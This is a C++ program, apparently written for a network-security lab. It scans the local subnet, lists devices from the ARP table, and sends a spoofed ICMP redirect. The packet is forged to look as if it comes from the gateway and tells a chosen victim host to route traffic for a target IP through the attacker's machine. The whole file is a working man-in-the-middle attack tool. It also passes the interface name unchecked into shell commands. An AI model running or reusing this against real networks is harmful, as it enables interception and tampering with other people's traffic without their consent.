#include <tins/tins.h>
#include <iostream>
#include <set>
#include <fstream>
#include <sstream>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <array>
#include <memory>
#include <unistd.h>
#include <cstring>
#define PACKET_LEN 1024

using namespace std;
using namespace Tins;
typedef pair<int, int> pii;
struct Device {
    string ip;
    string mac;
}; vector<Device> devices;

string get_default_gateway(string iface_name);
void go_ping_all(string iface_name);
void print_arp_table(string iface_name);
pii  redirect_setup();
void send_icmp_redirect(const std::string& iface_name,
                        const std::string& victim_ip_str,
                        const std::string& victim_mac_str,
                        const std::string& gateway_ip_str,
                        const IPv4Address& attacker_ip,
                        const HWAddress<6>& attacker_mac,
                        const std::string& target_ip_str);

int main(int argc, char* argv[]) {
    if (argc != 3) { cerr << "Usage: sudo ./a <target_ip> <network_interface>\n"; return 1; }

    string target_ip = argv[1];
    string iface_name = argv[2];

    NetworkInterface iface(iface_name);
    HWAddress<6> hw_addr = iface.hw_address();
    IPv4Address ip_addr = iface.addresses().ip_addr;
    // string gateway_ip = get_default_gateway(iface_name);

    cout << "[*] Using interface: " << iface.name() << endl;
    cout << "[*] Local IP: " << ip_addr << ", MAC: " << hw_addr << endl;

    go_ping_all(iface_name);
    print_arp_table(iface_name);

    auto [victim_index, gateway_index] = redirect_setup();
    string victim_ip = devices[victim_index].ip;
    string victim_mac = devices[victim_index].mac;
    string gateway_ip = devices[gateway_index].ip;
    string gateway_mac = devices[gateway_index].mac;

    cout << "[*] Victim: " << victim_ip << " " << victim_mac << endl;
    cout << "[*] Gateway: " << gateway_ip << " " << gateway_mac << endl;
    cout << "[*] Attacker: " << ip_addr << " " << hw_addr << endl;
    
    // Send ICMP redirect to victim
    send_icmp_redirect(iface_name, victim_ip, victim_mac, gateway_ip, ip_addr, hw_addr, target_ip);
}

// Get default gateway
string get_default_gateway(string iface_name) {
    string gateway_ip;
    ifstream route_file("/proc/net/route");
    if (route_file.is_open()) {
        string line;
        getline(route_file, line); // Skip header
        while (getline(route_file, line)) {
            istringstream iss(line);
            string iface, dest, gw, flags;
            if (iss >> iface >> dest >> gw >> flags) {
                if (iface == iface_name && dest == "00000000") {
                    // Convert hex to IP
                    char *pEnd;
                    unsigned long g = strtoul(gw.c_str(), &pEnd, 16);
                    struct in_addr addr;
                    addr.s_addr = g;
                    gateway_ip = string(inet_ntoa(addr));
                    break;
                }
            }
        }
        route_file.close();
    }
    return gateway_ip;
}

void go_ping_all(string iface_name) {
    cout << "\n[*] Pinging all IPs in subnet..." << endl;
    // Get interface IP and netmask
    auto execCommand = [] (const char* command) -> string {
        array<char, 128> buffer;
        string result;
        unique_ptr<FILE, decltype(&pclose) > pipe(popen(command, "r"), pclose);
        if (!pipe) {
            throw runtime_error("popen() failed!");
        }
        while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
            result += buffer.data();
        }
        return result;
    };
    string command = "ip addr show " + iface_name;
    string buffer = execCommand(command.c_str());

    int ip_start = buffer.find("inet ") + 5;
    int ip_end = buffer.find("/", ip_start);
    int mask_end = buffer.find(" ", ip_end);

    string ip_str = buffer.substr(ip_start, ip_end - ip_start);
    string mask_str = buffer.substr(ip_end + 1, mask_end - (ip_end + 1));

    struct in_addr addr;
    inet_aton(ip_str.c_str(), &addr);
    int mask = atoi(mask_str.c_str());

    // Calculate network address
    addr.s_addr = (addr.s_addr << (32 - mask)) >> (32 - mask);
    string current_ip(inet_ntoa(addr));

    // Ping all IPs in subnet
    int n = 1 << (32 - mask);
    for (int i = 0; i < n; ++i) {
        command = "ping -c 1 -i 0.01 " + current_ip + " > /dev/null 2>&1 &";
        system(command.c_str());
        
        // Increment IP address
        addr.s_addr = htonl(addr.s_addr);
        addr.s_addr++;
        addr.s_addr = ntohl(addr.s_addr);
        current_ip = string(inet_ntoa(addr));
    }
}

void print_arp_table(string iface_name) {
    cout << "\n[*] Reading ARP table..." << endl;

    ifstream arp_file("/proc/net/arp");
    string line;
    getline(arp_file, line); // Skip header line
    
    while (getline(arp_file, line)) {
        istringstream iss(line);
        string ip, hw_type, flags, mac, mask, device;
        iss >> ip >> hw_type >> flags >> mac >> mask >> device;
        
        if (device == iface_name && mac != "00:00:00:00:00:00") {
            cout << "[+] " << ip << " is at " << mac << endl;
            devices.push_back({ip, mac});
        }
    }
    std::cout << "\nAvailable devices\n";
    std::cout << "-----------------------------\n";
    std::cout << "Index\t| IP\t\t| MAC\n";
    std::cout << "-----------------------------\n";
    for (size_t i = 0; i < devices.size(); ++i) std::cout << i << "\t| " << devices[i].ip << "\t| " << devices[i].mac << "\n";
    std::cout << "-----------------------------\n";
}

pii redirect_setup() {
    int index, gateway_index;
    cout << "Select Victim IP index: ";
    cin >> index;
    cout << "Select Gateway IP index: ";
    cin >> gateway_index;
    return {index, gateway_index};
}

void send_icmp_redirect(const std::string& iface_name,
                        const std::string& victim_ip_str,
                        const std::string& victim_mac_str,
                        const std::string& gateway_ip_str,
                        const IPv4Address& attacker_ip,
                        const HWAddress<6>& attacker_mac,
                        const std::string& target_ip_str) {
    
    NetworkInterface iface(iface_name);
    NetworkInterface::Info iface_info = iface.addresses();
    
    IPv4Address victim_ip(victim_ip_str);
    HWAddress<6> victim_mac(victim_mac_str);
    IPv4Address gateway_ip(gateway_ip_str);
    IPv4Address target_ip(target_ip_str);

    // Fake inner IP header (as placeholder for original packet)
    IP inner_ip(target_ip, victim_ip);  // src = target, dst = victim
    inner_ip.ttl(64);
    inner_ip.id(0);
    inner_ip.flags(IP::Flags(0));
    inner_ip.protocol(1);

    // Fake ICMP Echo reply as payload (8 bytes)
    ICMP echo(ICMP::ECHO_REPLY);
    echo.id(0);
    echo.sequence(0);

    // Serialize fake original datagram
    IP inner_packet = inner_ip / echo;
    std::vector<uint8_t> inner_bytes = inner_packet.serialize();
    
    // ICMP Redirect message
    RawPDU inner_raw(inner_bytes);
    ICMP redirect(ICMP::REDIRECT);
    redirect.code(1);  // Code 1 = Host redirect
    redirect.gateway(attacker_ip);     // gateway = attacker ip
    // redirect.gateway(gateway_ip);   // reverse gateway
    redirect.inner_pdu(inner_raw);

    // Wrap with outer IP and Ethernet
    IP ip_outer(victim_ip, gateway_ip);         // dst = victim, src = gateway
    // IP ip_outer(victim_ip, attacker_ip);     // reverse outer ip
    ip_outer.protocol(1);

    EthernetII eth(victim_mac, attacker_mac);
    eth.payload_type(EthernetII::IP);

    PacketSender sender;
    eth.payload_type(EthernetII::IP);
    auto packet = eth / ip_outer / redirect;
    sender.send(packet, iface);
    
    cout << "[+] Sent ICMP redirect to " << victim_ip_str << endl;
}
